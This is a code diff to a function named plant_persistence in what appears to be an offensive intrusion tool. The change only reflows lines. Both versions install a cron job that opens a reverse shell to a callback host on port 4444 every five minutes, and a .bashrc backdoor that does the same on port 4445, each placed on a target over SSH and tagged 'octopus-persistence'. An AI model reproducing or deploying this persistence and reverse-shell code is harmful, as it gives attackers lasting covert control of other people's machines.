@@ -146,10 +146,7 @@ def plant_persistence(
         our_ip = callback_host
         if our_ip:
             cron_marker = "octopus-persistence"
-            cron_cmd = (
-                f"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{our_ip}/4444 0>&1' "
-                f"2>/dev/null # {cron_marker}"
-            )
+            cron_cmd = f"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{our_ip}/4444 0>&1' 2>/dev/null # {cron_marker}"
             # Add to crontab without overwriting
             existing_cron = _ssh_exec(client, "crontab -l 2>/dev/null", timeout=5)
             if cron_marker not in existing_cron and "/dev/tcp" not in existing_cron:
@@ -197,11 +194,7 @@ def plant_persistence(
         # ── METHOD 4: .bashrc backdoor ───────────────────────────
         print(f"    {C_CYAN}[*] Adding .bashrc persistence...{C_RESET}")
         bashrc_marker = "octopus-persistence"
-        bashrc_payload = (
-            f"(bash -i >& /dev/tcp/{our_ip}/4445 0>&1 &) 2>/dev/null # {bashrc_marker}"
-            if our_ip
-            else ""
-        )
+        bashrc_payload = f"(bash -i >& /dev/tcp/{our_ip}/4445 0>&1 &) 2>/dev/null # {bashrc_marker}" if our_ip else ""
         if bashrc_payload:
             existing = _ssh_exec(
                 client,
